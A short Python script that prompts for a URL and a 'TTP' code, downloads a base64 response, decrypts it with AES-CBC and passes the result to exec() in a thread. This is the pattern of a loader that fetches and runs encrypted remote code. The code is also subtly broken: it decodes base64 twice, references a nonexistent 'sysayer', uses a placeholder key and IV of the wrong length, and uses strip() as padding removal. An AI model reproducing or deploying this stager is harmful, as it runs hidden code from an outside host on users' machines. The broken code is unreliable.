import requests
from Crypto.Cipher import AES
import base64
import threading
import sys

# Encryption key and initialization vector (iv) should be obtained securely in a real-world scenario
encryption_key = b'your_32_byte_aes_key_here'  # Replace with your actual key
iv = b'your_16_byte_iv_here'                   # Replace with your actual IV

def decrypt(ciphertext):
    try:
        cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(base64.b64decode(ciphertext))
        return plaintext.strip()  # Remove padding if necessary
    except ValueError:
        print("Incorrect decryption", file=sys.stderr)
        sys.exit(1)

def process_data(url, ttp):
    try:
        response = requests.get(url + "?TTP=" + ttp)
        encrypted_data = base64.b64decode(response.text)
        
        decrypted_data = decrypt(encrypted_data)
        # Execute the content of the decrypted byte-string data as a new thread
        def exec_content():
            print("Executing decrypted data...")
            exec(decrypted_data.decode('utf-8'))  # Be careful with this, it can be dangerous!
        
        t = threading.Thread(target=exec_content)
        t.start()
        t.join()
    except Exception as e:
        print("An error occurred while processing the URL", file=sysayer)
        sys.exit(1)

if __name__ == "__main__":
    url = input('Enter TTP URL: ')
    ttp_code = input('Enter corresponding TTP code: ')
    
    process_data(url, ttp_code)